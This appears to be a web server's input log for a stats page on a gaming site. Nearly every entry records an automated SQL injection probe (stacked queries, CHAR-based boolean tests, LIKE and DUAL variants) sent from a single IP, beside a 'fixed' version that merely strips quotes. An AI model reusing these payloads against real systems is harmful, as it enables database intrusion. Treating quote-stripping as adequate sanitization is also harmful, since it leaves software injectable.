Date: 13-09-2017 03:14:54 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ,,,',".(.,, Fixed: Annabelle            ,,,,.(.,, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:32 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ` WHERE 1976=1976;SELECT (CASE WHEN (3503=3503) THEN 1 ELSE 3503*(SELECT 3503 UNION ALL SELECT 9900) END)--, Fixed: Annabelle             WHERE 1976=1976;SELECT (CASE WHEN (3503=3503) THEN 1 ELSE 3503*(SELECT 3503 UNION ALL SELECT 9900) END)--, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:32 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            `) WHERE 3347=3347;SELECT (CASE WHEN (6679=6916) THEN 1 ELSE 6679*(SELECT 6679 UNION ALL SELECT 6916) END)--, Fixed: Annabelle            ) WHERE 3347=3347;SELECT (CASE WHEN (6679=6916) THEN 1 ELSE 6679*(SELECT 6679 UNION ALL SELECT 6916) END)--, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:32 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            `) WHERE 5780=5780;SELECT (CASE WHEN (3503=3503) THEN 1 ELSE 3503*(SELECT 3503 UNION ALL SELECT 9900) END)--, Fixed: Annabelle            ) WHERE 5780=5780;SELECT (CASE WHEN (3503=3503) THEN 1 ELSE 3503*(SELECT 3503 UNION ALL SELECT 9900) END)--, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:32 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ' IN BOOLEAN MODE);SELECT (CASE WHEN (5675=3443) THEN 1 ELSE 5675*(SELECT 5675 UNION ALL SELECT 3443) END)--, Fixed: Annabelle             IN BOOLEAN MODE);SELECT (CASE WHEN (5675=3443) THEN 1 ELSE 5675*(SELECT 5675 UNION ALL SELECT 3443) END)--, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:32 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ' IN BOOLEAN MODE);SELECT (CASE WHEN (3503=3503) THEN 1 ELSE 3503*(SELECT 3503 UNION ALL SELECT 9900) END)--, Fixed: Annabelle             IN BOOLEAN MODE);SELECT (CASE WHEN (3503=3503) THEN 1 ELSE 3503*(SELECT 3503 UNION ALL SELECT 9900) END)--, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:33 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ') AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- HhuI, Fixed: Annabelle            ) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- HhuI, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:33 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ' AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- jFrr, Fixed: Annabelle             AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- jFrr, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:33 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            " AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- XqnE, Fixed: Annabelle             AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- XqnE, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:34 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ') AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ('voUY'='voUY, Fixed: Annabelle            ) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (voUY=voUY, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:34 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ')) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (('DDtW'='DDtW, Fixed: Annabelle            )) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((DDtW=DDtW, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:34 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            '))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((('ybqT'='ybqT, Fixed: Annabelle            ))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (((ybqT=ybqT, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:34 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ' AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND 'VAud'='VAud, Fixed: Annabelle             AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND VAud=VAud, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:34 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ') AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ('XMFY' LIKE 'XMFY, Fixed: Annabelle            ) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (XMFY LIKE XMFY, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:34 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ')) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (('MStq' LIKE 'MStq, Fixed: Annabelle            )) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((MStq LIKE MStq, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:34 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            '))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((('xsAm' LIKE 'xsAm, Fixed: Annabelle            ))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (((xsAm LIKE xsAm, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:34 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ' AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND 'gbkN' LIKE 'gbkN, Fixed: Annabelle             AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND gbkN LIKE gbkN, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:34 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ") AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ("llMh"="llMh, Fixed: Annabelle            ) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (llMh=llMh, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:35 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ")) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (("Amkl"="Amkl, Fixed: Annabelle            )) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((Amkl=Amkl, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:35 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            "))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((("zniH"="zniH, Fixed: Annabelle            ))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (((zniH=zniH, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:35 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            " AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND "hDAr"="hDAr, Fixed: Annabelle             AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND hDAr=hDAr, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:35 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ") AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ("MeMf" LIKE "MeMf, Fixed: Annabelle            ) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (MeMf LIKE MeMf, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:35 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ")) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (("aIFU" LIKE "aIFU, Fixed: Annabelle            )) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((aIFU LIKE aIFU, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:35 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            "))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((("kNkV" LIKE "kNkV, Fixed: Annabelle            ))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (((kNkV LIKE kNkV, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:35 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            " AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND "uyAI" LIKE "uyAI, Fixed: Annabelle             AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND uyAI LIKE uyAI, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:35 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            %') AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ('%'=', Fixed: Annabelle            %) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (%=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:36 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            %')) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (('%'=', Fixed: Annabelle            %)) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((%=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:36 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            %'))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((('%'=', Fixed: Annabelle            %))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (((%=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:36 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            %' AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND '%'=', Fixed: Annabelle            % AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND %=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:36 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            %") AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ("%"=", Fixed: Annabelle            %) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (%=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:36 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            %")) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (("%"=", Fixed: Annabelle            %)) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((%=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:36 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            %"))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((("%"=", Fixed: Annabelle            %))) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (((%=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:36 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            %" AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND "%"=", Fixed: Annabelle            % AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND %=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:37 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ') WHERE 3426=3426 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- Pdqo, Fixed: Annabelle            ) WHERE 3426=3426 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- Pdqo, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:37 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ") WHERE 1854=1854 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- lniK, Fixed: Annabelle            ) WHERE 1854=1854 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- lniK, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:37 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ' WHERE 1146=1146 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- sNQb, Fixed: Annabelle             WHERE 1146=1146 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- sNQb, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:37 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            " WHERE 4808=4808 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- THAO, Fixed: Annabelle             WHERE 4808=4808 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- THAO, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:37 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            '||(SELECT 'NfBF' FROM DUAL WHERE 6589=6589 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))))||', Fixed: Annabelle            (SELECT NfBF FROM DUAL WHERE 6589=6589 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))), Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
